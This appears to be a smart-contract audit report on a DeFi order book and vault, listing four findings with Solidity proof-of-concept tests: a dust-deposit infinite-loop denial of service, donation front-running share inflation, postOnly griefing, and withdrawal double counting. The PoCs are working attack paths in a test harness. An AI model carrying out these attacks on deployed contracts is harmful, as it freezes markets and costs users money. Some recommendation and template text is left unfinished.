### [M-1] Denial of Service via Dust Liquidity Provisioning
### Summary
An attacker can permanently freeze the market with a single, inexpensive transaction. By being the first to deposit a tiny, "dust-like" amount of funds, the attacker puts the vault into a fragile state due to a mathematical rounding flaw. As a result, any subsequent, normal-sized trade gets trapped in an infinite loop, runs out of gas, and fails. This attack renders the market permanently unusable for all legitimate users.

### Finding Description
The vulnerability is a critical Denial of Service (DoS) that stems from a mathematical flaw when the vault operates with extremely low liquidity. The core issue is that the logic for filling trades in the _matchAggressiveBuyWithCap and _fillVaultForBuy functions does not safely handle the rounding errors that occur when the vaultAskOrderSize is a tiny, dust-like number. The attack path is as follows:

1. The Setup: An attacker acts as the first liquidity provider. They call the deposit function, which in turn calls _mintAndDeposit. They provide a very small, "dust-like" amount for baseDeposit and quoteDeposit (e.g., 0.1 ether). Inside _mintAndDeposit, the _getVaultSizesForBaseAmount function is called. Due to integer division and the contract's constants, this tiny deposit results in an absurdly small _newAskSize (e.g., 4). This fragile state is then permanently saved to the market contract via market.updateVaultOrdSz.
2. The Trigger (The Victim's Trade): A normal user then attempts to execute a regular-sized market buy. This calls the _matchAggressiveBuyWithCap function, which begins its while loop to fill the order.
3. The Infinite Loop: The while loop calls _fillVaultForBuy. Inside this function, the math to calculate the sizeFilled for each iteration is performed against the dust-like liquidity (4). The integer division in the formula _cachedLastVaultSize = toU96(FixedPointMathLib.mulDiv(...)) causes the size to shrink 4 -> 3 -> 2 -> 1 -> 0. Once the _availableSize becomes 0, the line sizeLeft -= _availableSize becomes sizeLeft -= 0. The sizeLeft variable stops decreasing, but the loop's exit condition (sizeLeft > 0) is still true. The transaction is now trapped in an infinite loop.

### Impact Explanation
The impact is a Permanent Denial of Service (DoS), which is a Critical vulnerability. Once an attacker has seeded the pool with dust liquidity, every subsequent trade that is large enough to interact with the vault will get stuck in the same infinite loop and fail due to running out of gas. The market becomes permanently "bricked" and unusable for all users.

### Likelihood Explanation
The likelihood of this attack is High. An attacker does not need any special privileges or large amounts of capital. They only need to be the first person to deposit liquidity into a new market and provide an amount that is small enough to trigger the rounding errors but large enough to pass any require checks in the deposit function

### Proof of Concept
```solidity
    function test_DOS_via_DustLiquidity() public {
        address attacker = genAddress();
        uint256 tinyBaseDeposit = 0.1 ether;
        uint256 tinyQuoteDeposit = 0.1 ether;
        eth.mint(attacker, tinyBaseDeposit);
        usdc.mint(attacker, tinyQuoteDeposit);
        vm.startPrank(attacker);
        eth.approve(address(vault), tinyBaseDeposit);
        usdc.approve(address(vault), tinyQuoteDeposit);
        vault.deposit(tinyBaseDeposit, tinyQuoteDeposit, attacker);
        vm.stopPrank();
        (,,,,,, uint96 vaultAskSize,) = orderBook.getVaultParams();
        console.log("Vault size created by dust deposit:", vaultAskSize);
        assertTrue(vaultAskSize > 0, "Dust deposit failed to create any liquidity size");
        console.log(" A victim attempts a large trade ");

        address victim = genAddress();
        uint256 victimQuoteAmount = 50_000 * 1e18; // A large trade
        
        usdc.mint(victim, victimQuoteAmount);
        vm.startPrank(victim);
        usdc.approve(address(marginAccount), victimQuoteAmount);
        marginAccount.deposit(victim, address(usdc), victimQuoteAmount);
        console.log("Expecting the transaction to panic from an infinite loop");
        vm.expectRevert(); 
        // This transaction will get stuck in an infinite loop inside `_matchAggressiveBuyWithCap`
        // because the `sizeFilled` in each iteration will round down to zero.
        orderBook.placeAndExecuteMarketBuy(
            uint96((victimQuoteAmount * PRICE_PRECISION) / 1e18),
            0, 
            true, // Use the margin account
            false // Not FillOrKill, to ensure it doesn't revert for that reason
        );
        console.log("SUCCESS: The transaction failed as expected, Ez...");
    }

```

### Recommendation
Add a Minimum deposit check for the first LP


### [H-1] Asset Inflation via Untracked Deposits
### Summary
In the vault's deposit and minting logic that allows an attacker to manipulate the share price calculation by making a direct, untracked deposit (a "donation") to the vault's account. This manipulation forces subsequent liquidity providers to overpay for their shares, leading to a direct financial loss for the victim and a corresponding gain for the attacker.

### Description
The vulnerability stems from the vault's reliance on an external, manipulable balance as its source of truth for total assets. The _convertToAssets function, which is called during a deposit or mint, calculates the value of shares based on the vault's totalAssets(). The totalAssets() function, in turn, reads the vault's raw token balance directly from the MarginAccount contract.
This breaks the security guarantee that the vault's internal accounting should be isolated from external influence. The MarginAccount.deposit function allows any user to directly transfer tokens to the vault's address, bypassing the vault's own controlled deposit function. Describe which security guarantees it breaks and how it breaks them. If this bug does not automatically happen, showcase how a malicious input would propagate through the system to the part of the code where the issue occurs.
A malicious user can exploit this by front-running a legitimate liquidity provider's transaction:

- The attacker sees a large, legitimate deposit transaction from a victim (Bob) in the mempool.
- The attacker front-runs Bob by calling MarginAccount.deposit directly, sending an untracked, unbalanced amount of tokens to the vault's address.
- Bob's deposit transaction now executes. The internal share calculation reads the now-inflated and imbalanced totalAssets() from the MarginAccount.
- The flawed calculation forces Bob to deposit more assets than he should have for the number of shares he receives, causing him an immediate financial loss.

### Impact Explanation
High. While it does not lead to a direct drain of all funds from the contract by an attacker, it allows for the manipulation of core accounting logic, causing financial loss for users and creating unfair value distribution

### Likelihood Explanation
Med. The conditions for the attack are easily met and do not require any special privileges, but the attacker have to spend from hos pocket.

### Proof of Concept
```solidity
        function test_MempoolFrontRunAttack_MintFunction() public {
    console.log("=== MEMPOOL FRONT-RUN ATTACK: Mint Function ===");

    // Step 1: Create initial liquidity pool (Alice)
    uint256 aliceBaseDeposit = 1000 ether;
    uint256 aliceQuoteDeposit = 1000 ether;

    address alice = genAddress();
    eth.mint(alice, aliceBaseDeposit);
    usdc.mint(alice, aliceQuoteDeposit);

    vm.startPrank(alice);
    eth.approve(address(vault), aliceBaseDeposit);
    usdc.approve(address(vault), aliceQuoteDeposit);
    uint256 aliceShares = vault.deposit(aliceBaseDeposit, aliceQuoteDeposit, alice);
    vm.stopPrank();

    console.log("Alice shares:");
    console.log(aliceShares);

    // Step 2: Bob wants to mint shares
    uint256 bobSharesToMint = 100; // Some number of shares
    address bob = genAddress();

    // Preview what Bob should get before manipulation
    (uint256 expectedBase, uint256 expectedQuote) = vault.previewMint(bobSharesToMint);
    console.log("Expected base/quote for mint BEFORE attack:");
    console.log(expectedBase);
    console.log(expectedQuote);

    // Reserves before attack
    (uint256 vb0, uint256 vq0) = vault.totalAssets();
    console.log("Reserves BEFORE attack (base, quote):");
    console.log(vb0);
    console.log(vq0);

    // Step 3: ATTACK - Front-run by inflating vault's quote balance
    uint256 addQuote = vq0 / 10; // 10% of current reserves
    address attacker = genAddress();
    usdc.mint(attacker, addQuote);

    vm.startPrank(attacker);
    usdc.approve(address(marginAccount), addQuote);
    marginAccount.deposit(address(vault), address(usdc), addQuote);
    vm.stopPrank();

    // Reserves after attack
    (uint256 vb1, uint256 vq1) = vault.totalAssets();
    console.log("Reserves AFTER attack (base, quote):");
    console.log(vb1);
    console.log(vq1);

    // Step 4: Bob's mint() call now reads manipulated reserves
    vm.startPrank(bob);
    // Bob needs to have enough tokens to actually mint
    eth.mint(bob, expectedBase * 2); // Give extra to be safe
    usdc.mint(bob, expectedQuote * 2);
    eth.approve(address(vault), expectedBase * 2);
    usdc.approve(address(vault), expectedQuote * 2);

    // This will call _convertToAssets(isDeposit=true) with manipulated reserves
    (uint256 actualBase, uint256 actualQuote) = vault.mint(bobSharesToMint, bob);
    vm.stopPrank();

    console.log("Actual base/quote received for mint AFTER attack:");
    console.log(actualBase);
    console.log(actualQuote);

    // Step 5: Impact analysis
    if (actualBase != expectedBase || actualQuote != expectedQuote) {
        console.log("MANIPULATION DETECTED!");
        console.log("Base difference:");
        console.log(int256(actualBase) - int256(expectedBase));
        console.log("Quote difference:");
        console.log(int256(actualQuote) - int256(expectedQuote));
    } else {
        console.log("No manipulation detected in this test");
    }

    // Assertions
    assertEq(vb1, vb0, "Base reserve should not change for quote-only attack");
    assertGt(vq1, vq0, "Quote reserve should increase");
    
    // The key assertion: mint() should be affected by the manipulation
    assertTrue(
        actualBase != expectedBase || actualQuote != expectedQuote,
        "Mint function should be affected by reserve manipulation"
    );
}

```

### Recommendation
Add a state variable and track the main balance using it and mint shares according to it.


### [I-1]: Flawed postOnly Logic Allows Griefing 
### Summary
The postOnly parameter in the addBuyOrder and addSellOrder functions is checked after the aggressive matching logic has already executed. This breaks the core promise of a postOnly order, which should fail before any trade occurs. This flaw can be exploited by an attacker to "grief" market makers by front-running their orders and forcing them to revert, causing a loss of gas fees.

### Description
The addBuyOrder and addSellOrder functions. A postOnly order is designed to guarantee that the user will be a passive "maker" and will never execute as an aggressive "taker." The contract should reject a postOnly order if it would match against an existing order.

The current implementation gets the order of operations wrong:
1. A user submits an order with _postOnly = true.
2. The contract first calls _matchAggressiveBuyWithCap or _matchAggressiveSell. This function's entire purpose is to aggressively fill the order against the best available prices. If a match exists, a trade happens here.
3. Only after the trade has already been executed does the code check the _postOnly flag with the line: require(_remainingSize == _size, OrderBookErrors.PostOnlyError()); If a trade occurred, this check will correctly fail, and the transaction will revert.

### Proof of Concept
``` solidity
    function test_PostOnlyGriefingAttack() public {        
        address normalUser = genAddress();
        uint32 initialBidPrice = 200 * PRICE_PRECISION; // e.g., $200.00
        uint96 initialBidSize = 10 * SIZE_PRECISION;
        // Fund the user and have them place a buy order
        _addBuyOrder(normalUser, initialBidPrice, initialBidSize, 0, true); // The user's order is postOnly
        // Sanity check the market state
        (uint256 bestBid, ) = orderBook.bestBidAsk();
        uint256 expectedBestBid = uint256(initialBidPrice) * vaultPricePrecision / PRICE_PRECISION;
        assertEq(bestBid, expectedBestBid, "Initial best bid was not set correctly");
        console.log("Initial best bid is set at:", bestBid);
        console.log(" A market maker (Alice) submits a postOnly order");
        address alice = genAddress();
        // Alice wants to sell at a price slightly higher than the current best bid.
        // Her order should NOT trade.
        uint32 aliceSellPrice = initialBidPrice + _tickSize; 
        uint96 aliceSellSize = 5 * SIZE_PRECISION;
        console.log("An attacker front-runs Alice");
        address attacker = genAddress();
        // The attacker places a small buy order at Alice's exact price.
        // This moves the bestBid up to match Alice's sell price.
        _addBuyOrder(attacker, aliceSellPrice, 1 * SIZE_PRECISION, 0, false);
        // Sanity check: the price has now moved
        (bestBid, ) = orderBook.bestBidAsk();
        expectedBestBid = uint256(aliceSellPrice) * vaultPricePrecision / PRICE_PRECISION;
        assertEq(bestBid, expectedBestBid, "Attacker failed to move the best bid price");
        console.log("Attacker successfully moved the best bid to:", bestBid);
        // This will trigger the buggy, late `postOnly` check and cause a revert.
        vm.startPrank(alice);
        uint256 aliceBaseAmount = (uint256(aliceSellSize) * 10 ** eth.decimals()) / SIZE_PRECISION;
        eth.mint(alice, aliceBaseAmount);
        eth.approve(address(marginAccount), aliceBaseAmount);
        marginAccount.deposit(alice, address(eth), aliceBaseAmount);
        vm.expectRevert(OrderBookErrors.PostOnlyError.selector);
        orderBook.addSellOrder(aliceSellPrice, aliceSellSize, true); // true for postOnly
        console.log("Alice's transaction failed as expected EZZZZZZZ.....");
    }
    

```

### Recommendation
The fix is to move the _postOnly check to the beginning of the addSellOrder and addBuyOrder functions, before any funds are consumed or any matching logic is executed.

### [I-2] Double counting in _convertToAssetsWithNewSize
### Summary
In the _convertToAssetsWithNewSize function, which incorrectly calculates withdrawal amounts when a partially filled order is present. The flaw causes a "double-counting" of the vault's debts or credits, leading to unfair payouts and creating a vector for draining funds from the pool.

### Description
The function is responsible for calculating the assets owed to a liquidity provider upon withdrawal. It contains two main logical paths: a simple path for normal withdrawals and a complex path for when a withdrawal interacts with a partially filled order. The vulnerability lies within this complex path.
The code attempts to create a "clean" reserve state by adjusting for any outstanding debts or credits from partial fills. It then correctly calculates the user's proportional share of this clean reserve. However, it proceeds to incorrectly add or subtract the full debt/credit a second time from the user's final payout.
A malicious user can trigger this bug by creating a specific state of partial fills before withdrawing their own liquidity. For example, by executing a trade larger than the vault's current trading size, they create a debt owed by the vault. When they subsequently withdraw, the flawed logic is triggered:
- The vault's reserve is correctly adjusted to a "clean" state, accounting for the debt.
- The flaw is triggered when the code then adds the full amount of the vault's debt to the user's already-calculated fair share, effectively paying them twice for the same liability.
- The user's fair share is calculated based on this clean reserve.

### Proof of Concept
```solidity
 function testDoubleSpendingOnWithdraw() public {
    // 1) Setup: vault maker deposits balanced liquidity
        address vaultMaker = genAddress();
        uint256 amountBase = 1_000e18;
        uint256 amountQuote = 2_000e18;

        eth.mint(vaultMaker, amountBase);
        usdc.mint(vaultMaker, amountQuote);

        vm.startPrank(vaultMaker);
        eth.approve(address(vault), amountBase);
        usdc.approve(address(vault), amountQuote);
        uint256 shares = vault.deposit(amountBase, amountQuote, vaultMaker);
        vm.stopPrank();

        // 2) Create partial fills on both sides so that partiallyFilled{Ask,Bid} > 0
        //    - Market buy against vault ask (leave partiallyFilledAskSize > 0)
        //    - Market sell against vault bid (leave partiallyFilledBidSize > 0)
        (,,, uint256 vaultBestAsk, uint96 askPartially,,,) = orderBook.getVaultParams();
        (, uint256 vaultBestBid,, , uint96 bidPartially, uint96 vaultBidOrderSize,,) = orderBook.getVaultParams();
        // Sanity: initially partials should be 0
        assertEq(askPartially, 0);
        assertEq(bidPartially, 0);

        // Execute a market buy to generate ask partials
        address taker1 = genAddress();
        uint256 quoteToBuyTokens = 500e18; // pick a mid value, enough to leave partials
        usdc.mint(taker1, quoteToBuyTokens);
        vm.startPrank(taker1);
        usdc.approve(address(orderBook), quoteToBuyTokens);
        // placeAndExecuteMarketBuy expects _quoteSize in PRICE_PRECISION units
        orderBook.placeAndExecuteMarketBuy(
            uint96((quoteToBuyTokens * PRICE_PRECISION) / 10 ** usdc.decimals()), 0, false, true
        );
        vm.stopPrank();

        address taker2 = genAddress();
        uint96 sizeToSell = 25_000_000_000;
        uint256 baseToSellTokens = uint256(sizeToSell) * 10 ** eth.decimals() / SIZE_PRECISION;
        eth.mint(taker2, baseToSellTokens);
        vm.startPrank(taker2);
        eth.approve(address(marginAccount), baseToSellTokens);
        marginAccount.deposit(taker2, address(eth), baseToSellTokens);
        orderBook.placeAndExecuteMarketSell(sizeToSell, 0, true, true);
        vm.stopPrank();

        (,, uint96 partiallyFilledBid,, uint96 partiallyFilledAsk,,,) = orderBook.getVaultParams();
        assert(partiallyFilledBid > 0 || partiallyFilledAsk > 0);

        // 3) Compute “fair” expected payout for a small withdraw, then compare to actual
        uint256 ts = vault.totalSupply();
        uint256 sharesToBurn = shares / 10; // withdraw 10% of shares
        assertGt(sharesToBurn, 0);

        // Current reserves
        uint256 reserveBase = marginAccount.getBalance(address(vault), address(eth));
        uint256 reserveQuote = marginAccount.getBalance(address(vault), address(usdc));

        // Pro-rata (rounding down, to mirror contract mulDiv)
        uint256 baseProRata = (sharesToBurn * reserveBase) / ts;
        uint256 quoteProRata = (sharesToBurn * reserveQuote) / ts;

         (,,, vaultBestAsk, partiallyFilledAsk,,,) = orderBook.getVaultParams();
        (, vaultBestBid, partiallyFilledBid,, ,,,) = orderBook.getVaultParams();

        // Market params (decimals/precision) from vault
        (uint32 pricePrecision, uint96 sizePrecision,,,,,,,,,) = orderBook.getMarketParams();

        // Net “owed to vault” (copying contract math/signs)
        // base: ((ask - bid) * 10^baseDecimals) / sizePrecision
        // quote: ((bid*price_up - ask*price_dn) * 10^quoteDecimals) / vaultPricePrecision
        // Use int math to keep sign
        int256 baseOwedToVault = (int256(uint256(partiallyFilledAsk)) - int256(uint256(partiallyFilledBid)))
            * int256(int(10 ** eth.decimals())) / int256(uint256(sizePrecision));

        int256 bidFunds = int256(
            FixedPointMathLib.mulDivUp(partiallyFilledBid, vaultBestBid, sizePrecision)
        );
        int256 askFunds = int256(
            FixedPointMathLib.mulDiv(partiallyFilledAsk, vaultBestAsk, sizePrecision)
        );
        int256 quoteOwedToVault = (bidFunds - askFunds) * int256(int(10 ** usdc.decimals())) / int256(vaultPricePrecision);

        // Proportional “fair” user adjustment = (-owedToVault) * (shares/ts)
        int256 baseDebtToUsers = -baseOwedToVault;
        int256 quoteDebtToUsers = -quoteOwedToVault;
        int256 baseAdj = (baseDebtToUsers * int256(sharesToBurn)) / int256(ts);
        int256 quoteAdj = (quoteDebtToUsers * int256(sharesToBurn)) / int256(ts);

        uint256 expectedBaseFair = baseProRata;
        if (baseAdj >= 0) expectedBaseFair += uint256(baseAdj);
        else {
            uint256 ded = uint256(-baseAdj);
            expectedBaseFair = expectedBaseFair > ded ? expectedBaseFair - ded : 0;
        }

        uint256 expectedQuoteFair = quoteProRata;
        if (quoteAdj >= 0) expectedQuoteFair += uint256(quoteAdj);
        else {
            uint256 qded = uint256(-quoteAdj);
            expectedQuoteFair = expectedQuoteFair > qded ? expectedQuoteFair - qded : 0;
        }

        // 4) Withdraw and measure received amounts
        uint256 baseBefore = eth.balanceOf(vaultMaker);
        uint256 quoteBefore = usdc.balanceOf(vaultMaker);

        vm.startPrank(vaultMaker);
        vault.withdraw(sharesToBurn, vaultMaker, vaultMaker);
        vm.stopPrank();

        uint256 baseAfter = eth.balanceOf(vaultMaker);
        uint256 quoteAfter = usdc.balanceOf(vaultMaker);

        uint256 baseReceived = baseAfter - baseBefore;
        uint256 quoteReceived = quoteAfter - quoteBefore;

        console.log("-------------------------");
        console.log("Base received::", baseReceived);
        console.log("Base fair expected::::", expectedBaseFair);
        console.log("---------------------------");
        console.log("Quote receives::", quoteReceived);
        console.log("expected fair quote::", expectedQuoteFair);

        assertGt(baseReceived, expectedBaseFair, "base: no!!! double-credit observed");
        assertGt(quoteReceived, expectedQuoteFair, "quote: no!!! double-credit observed");
    }

```

### Recommendation
```solidity
            if (_baseOwedToVault < 0) {
                _reserveBase = _reserveBase - (uint256(-1 * _baseOwedToVault));
                _baseOwedToUser =
                    FixedPointMathLib.mulDiv(
                        shares,
                        _reserveBase,
                        totalSupply()
                    ) +
                    // @audit wwhat is this?
                    uint256(-1 * _baseOwedToVault);
            } else {
                _reserveBase = _reserveBase + (uint256(_baseOwedToVault));
                _baseOwedToUser =
                    FixedPointMathLib.mulDiv(
                        shares,
                        _reserveBase,
                        totalSupply()
                    )-
                    // @audit what is this double spending?
                    uint256(_baseOwedToVault);
            }
            if (_quoteOwedToVault < 0) {
                _reserveQuote =
                    _reserveQuote -
                    (uint256(-1 * _quoteOwedToVault));
                _quoteOwedToUser =
                    FixedPointMathLib.mulDiv(
                        shares,
                        _reserveQuote,
                        totalSupply()
                    ) +
                    //@audit overspending?
                    uint256(-1 * _quoteOwedToVault);
            } else {
                _reserveQuote = _reserveQuote + (uint256(_quoteOwedToVault));
                _quoteOwedToUser =
                    FixedPointMathLib.mulDiv(
                        shares,
                        _reserveQuote,
                        totalSupply()
                    ) -
                    // //@audit overspending?
                    uint256(_quoteOwedToVault);
            }

```